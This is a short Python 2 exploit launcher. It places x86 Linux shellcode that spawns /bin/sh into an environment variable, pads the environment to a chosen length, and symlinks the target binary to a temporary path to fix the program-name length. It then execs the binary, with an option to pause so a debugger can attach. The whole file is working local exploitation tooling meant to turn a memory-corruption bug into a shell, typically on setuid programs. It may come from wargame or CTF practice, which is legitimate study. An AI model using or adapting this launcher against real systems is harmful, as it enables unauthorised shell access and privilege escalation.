#!/usr/bin/env python2
import sys
from os          import execve, getpid, symlink, path
from collections import OrderedDict
from argparse    import ArgumentParser
from tempfile    import mktemp

p = ArgumentParser()
p.add_argument('payload')
p.add_argument('padding', type=int)
p.add_argument('binary')
p.add_argument('--wait', action='store_true', default=False)
a = p.parse_args()

env = OrderedDict()
env['a']='a'
env['b']='b'
env['c']='XXXX' + a.payload
env['d']='d' *    a.padding
env['sc']="\x90" + "1\xc9\xf7\xe9Ph\x2f\x2fshh\x2fbin\xb0\x0b\x89\xe3\xcd\x80"

if a.wait:
    raw_input("Attach to %s" % getpid())

# Normalize the length of the program name by making a symlink
temp     = mktemp()
symlink(path.abspath(a.binary), temp)

execve(temp,[],env)